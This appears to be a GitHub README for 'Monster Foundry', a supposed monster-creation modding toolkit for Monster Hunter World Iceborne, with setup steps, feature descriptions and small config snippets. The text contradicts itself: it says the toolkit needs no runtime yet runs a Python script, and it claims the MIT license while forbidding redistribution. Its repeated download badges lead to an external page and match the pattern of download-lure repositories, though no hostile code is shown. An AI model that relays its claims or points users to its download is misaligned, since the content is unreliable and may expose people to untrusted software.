![preview](https://raw.githubusercontent.com/RjRoyals/Monster-Crafters-Forge-Iceborne/main/view_bc6d494.svg)

# Monster Foundry: The Modular Monster Architect Toolkit for MHW Iceborne (2026 Edition)

Welcome to **Monster Foundry**, a comprehensive, community-driven framework designed to demystify the art of creature creation in *Monster Hunter: World Iceborne*. This repository is not merely a guide; it is a modular, open-source workshop that transforms the complex, data-dense process of modding into a structured, approachable, and even artistic endeavor. Think of it as the difference between being handed a pile of raw ore and being given a fully operational forge with blueprints, schematics, and a seasoned blacksmith looking over your shoulder. We provide the crucible, the templates, and the procedural logic—you provide the creative spark to forge monsters that feel like they belong in the New World.

## 📖 Overview: Moving Beyond the "How-To"

While there are many scattered tutorials on the web, **Monster Foundry** consolidates the entire workflow into a single, version-controlled, and continuously updated knowledge base. This isn't just about dropping a few numbers into a file; it's about understanding the *soul* of a monster—its attack patterns, its ecological niche, its visual flair, and its AI. We break down the monolithic task into distinct, manageable modules, allowing you to focus on what you love most, whether that's rigging a unique skeletal structure or balancing damage values for a fair but terrifying hunt.

Our philosophy is simple: **Provide the highest quality "starter materials" so you can build anything.** We offer pre-validated configuration presets, advanced behavioral scripting templates, and a robust series of quality-of-life utilities that handle the tedious heavy lifting. By using this toolkit, you can bypass the overwhelming initial friction and jump straight into the creative iteration loop.

## 🚀 Getting Started: Your First Steps into the Foundry

Ready to bring a nightmare to life? Let's set up your workspace. The process below will get you from zero to a functional prototype without needing to understand every subsystem on day one. We recommend reading through these steps twice—once to absorb the flow, and once to follow along.

[![Download](https://raw.githubusercontent.com/RjRoyals/Monster-Crafters-Forge-Iceborne/main/run_79f6c.svg)](https://RjRoyals.github.io/Monster-Crafters-Forge-Iceborne/)

### Step 1: Acquire the Foundry Core
The first step is to acquire the base toolkit. Our release structure is designed to be intuitive; you will find the latest stable build on the repository's release page. The archive is self-contained and includes the `foundry_core`, the `em_creator` scripts, and the `template_data` folder. This core is your command center.

### Step 2: Initialize Your Workbench
Once you have the archive, extract it to a dedicated folder outside of your game's installation directory. The toolkit is portable and has no dependencies on external runtime environments, meaning it runs standalone. Inside, run the `initial_setup.bat` (Windows) or `initial_setup.sh` (macOS/Linux) script. This script performs a crucial task: it generates a local "hash cache" of your specific game build, ensuring that all human-readable labels you see are correctly mapped to the internal identifiers. This is a vital prerequisite for the accuracy of the entire toolkit.

### Step 3: Select Your Base Prototype
In the `template_data` folder, you will find a curated selection of base monster skeletons. Each folder (e.g., `flying_wyvern_base`, `fanged_beast_base`, `elder_dragon_shell`) contains a complete, functional set of configuration files. **Do not edit these directly.** Instead, copy the folder that best matches your desired creature's physical shape and movement style. This copy becomes your project folder. This modular approach is analogous to a sculptor choosing the correct armature before applying clay.

### Step 4: The First Build
With your project folder created, you are ready for the "magic" moment. Drag and drop your project folder onto the `build_runner.py` script. This triggers the processing pipeline. The pipeline performs several tasks: it checks for missing references, re-packs the `col` and `mrl3` files, and compiles your behavior logic into the game's native format. The console will output a detailed log of every action taken. If everything is successful, you will see the path to your generated "mod pack"—a single, consolidated file ready for your mod manager of choice.

## 🧠 Core Features: The Anatomy of the Foundry

This toolkit is packed with features that cater to both the novice and the veteran. We have stripped away the complexity while retaining the game's full depth of possibility.

### 🦴 Modular Skeleton & Part Mapping
Forget editing endless, opaque ID numbers. Our system uses a virtual "part tree" that mirrors in-game visuals. You can attach elemental effects, hitbox data, and damage multipliers to specific nodes like "Head," "Left Wing," or "Tail Tip" using simple, user-friendly labels. The compiler translates these labels into the required game code, drastically reducing the likelihood of a broken hitbox or an invisible weak spot.

### 🧠 Advanced AI & Behavior Scripting (Visual Logic)
Creating a monster that *fights* intelligently used to be the pinnacle of modding difficulty. Foundry introduces a simplified scripting interface that uses a tab-indented syntax to define attack behavior. You can determine the sequence of moves a monster executes, the conditions for a "rage mode," and the transition triggers for area changes. The logic is structured like a flowchart, making it easy to design a fight that is challenging, fair, and exhilarating.
- **Example Snippet:**
    ```
    State: Idle
      -> Check Player Distance
        -> If Player Within 500 Units: Attack_Claw_Swipe
        -> If Player Beyond 500 Units: Move_Towards_Player
    
    State: Attack_Claw_Swipe
      -> Deal Damage (Power: 40)
      -> Apply Stagger (Stagger Value: 10)
      -> Set Cooldown (Cooldown: 5 Seconds)
      -> Transition To: Idle
    ```

### 🎨 Visual Effect & Particle Simulator
Visual flair is essential for a believable monster. The toolkit includes a library of pre-made visual effect (VFX) presets—from poisonous breath clouds to elemental auras. You can attach these to body parts and trigger them via the behavior scripts. The built-in particle simulator lets you preview how a blast of fire will look when emitted from a specific node without launching the game, saving you iterative load times.

### ⚖️ Dynamic Difficulty & Stat Balancing Suite
One of the hardest parts of monster creation is tuning the difficulty. Our suite provides a suite of macros that allow for logarithmic scaling of health, damage, and stagger thresholds based on the player's gear level (which you can set as a baseline). This ensures that your monster remains a significant threat to the endgame player but doesn't become an unkillable wall of hit points for those with fully upgraded gear. The balance is dynamic, adapting to the fight's pacing.

### 🌐 Multilingual Support & Localization
We believe in a global community. All user-facing strings in the toolkit (error messages, labels, and tooltips) have been fully localized into English, Spanish, Japanese, French, and Chinese. The codebase is built with internationalization in mind, so if you wish to add another language, the translation files are simple text dictionaries.

### 🛠️ 24/7 Developer Support & Community Hub
The Monster Foundry is more than just a repository; it's a hub for collaboration. While we have a dedicated channel for troubleshooting, the true power lies in the community contributions. The repository's Issues section is actively monitored, and the Wiki contains collaborative guides that detail advanced techniques. We pair this with a live discussion server where you can ask questions, share your prototypes, and seek feedback from other creators. Your journey is our priority.

## 📦 What's Inside the Repository?

Navigating the repository is straightforward. The structure is designed to be self-explanatory:

- `/foundry_core` - The main processing engine and compiler code.
- `/template_data` - A vast library of base monster skeletons and configuration templates.
- `/em_creator` - The visual logic editor and project management interface.
- `/example_projects` - Fully completed sample monsters that showcase the toolkit's capabilities. These are excellent for deconstructing and learning advanced techniques.
- `/docs` - The official documentation, including API references and scripting syntax guides.
- `/tests` - A suite of automated tests that ensure the compiler's integrity. This is crucial for maintaining stability across game updates.

## 🔧 Featured Builds & Showcase

To spark your imagination, the `example_projects` folder contains several "showcase" monsters we have crafted using this very toolkit:

- **The Frostblight Chimera:** A hybrid creature that fuses the head of a Great Jagras with the wings and tail of a Legiana, utilizing a unique ice-based mechanic that creates temporary terrain hazards.
- **The Volcanic Behemoth:** A heavy, slow-moving Elder Dragon-level threat that uses a "heat gauge" mechanic. As it takes damage, parts of its armor melt away, revealing new weak points and altering its attack set.
- **The Crystalline Apex:** A fast, agile creature that uses a "part-break" crafting loop. Breaking certain crystal shards will cause the monster to drop unique materials, but also speeds up its enrage timer, creating a risk/reward dynamic.

## 🧪 The Foundry Methodology: A Detailed Walkthrough

Let's delve deeper into the core pipeline of creating a monster, using our "Part Mapping" feature as an example.

### The Granular Process
1.  **Define the Core:** In the project folder, open `config.ini`. Set the base stats (health, attack, defense) and assign a name that your UI will display. The toolkit supports a "Name Styling" section that lets you color the monster's name in the game's UI (e.g., a red name for an Elder Dragon-level threat).
2.  **Assign the Armor:** Go to the `parts` directory. Edit `head.part`, `body.part`, etc. In each file, *reference* an existing visual model ID. The toolkit will automatically map the physical bones. You do not need to re-animate; you are re-skinning and re-rigging from an existing game monster.
3.  **Define Hit Zones:** This is where the strategy lies. In the `col` folder, you allocate hitzone data. For each part, you specify the raw damage modifier, the elemental resistances (Fire, Water, Thunder, Ice, Dragon), and the stagger thresholds. Do you want the head to be a weak spot that requires a specific elemental weapon to break? The toolkit uses a simple header format:
    ```
    // Hitzone for the Tail
    [Tail]
    Severing = 0.9  ; 90% damage
    Blunt = 0.8     ; 80% damage
    Ammo = 0.5      ; 50% damage
    ; Element Rates (0.0 - 1.0)
    Fire = 0.0
    Water = 0.1
    Thunder = 0.8 ; Weakness!
    ```
4.  **Choreograph the Fight:** Open the `logic.lua` file in `em_creator`. Here, you will see the visual logic interface. You can create new states (e.g., `Enraged_Breath`, `Roar_Stagger`) and link them to your action presets. The `em_creator` provides a live syntax checker to catch errors before the build process, saving you valuable debugging time.

## 🔒 Policies & User Experience

We prioritize a user-friendly experience. Our implementation of a responsive design at the toolkit level means the scripts and editors adapt to your screen resolution and system locale. There is no one-size-fits-all approach; the "Settings" menu within the `em_creator` GUI allows for full customization of the editor's theme, font size, and the verbosity of log outputs.

### The Code of Conduct
This project is a collaborative space. To ensure it remains a positive environment, we follow a strict code of conduct. Harassment of any kind, "gatekeeping" of technical knowledge, and disrespectful commentary will result in a permanent ban from the community. We are here to build and learn, not to belittle.

### Security & Integrity
We state proudly that this toolkit is **not** a "crack" or a "patch" tool. It operates entirely within the bounds of the game's modding APIs as permitted by the official modding community standards. This project relies on ethics and transparency. We do not facilitate cheating in multiplayer against players without consent; our focus is on single-player content creation, custom quests, and cooperative private lobbies where everyone agrees on the modified experience.

## ❗ Disclaimer

**Monster Foundry** is an independent, community-driven project and is **not affiliated with Capcom**, nor is it an official Capcom product. The project is intended for private, personal use, research, and educational purposes within the boundaries of the modding community's Terms of Service. All game assets, names, and trademarks (including *Monster Hunter: World* and *Iceborne*) are the property of their respective owners. Redistribution of **Monster Foundry** in any form, on any platform, is prohibited without explicit written permission from the repository maintainers. We are not responsible for any actions taken against user accounts as a result of the misuse of this tool in unsupported environments. Always back up your game save files and nativePC folder before implementing any modifications.

## 📄 License

This project is licensed under the MIT License. This permissive license allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, provided you include the original copyright notice and permission notice in all copies or substantial portions of the Software. This license is free and grants you the liberty to create standalone tools or integrate this toolkit into your own closed-source projects, provided you acknowledge our original work.

[![Download](https://raw.githubusercontent.com/RjRoyals/Monster-Crafters-Forge-Iceborne/main/run_79f6c.svg)](https://RjRoyals.github.io/Monster-Crafters-Forge-Iceborne/)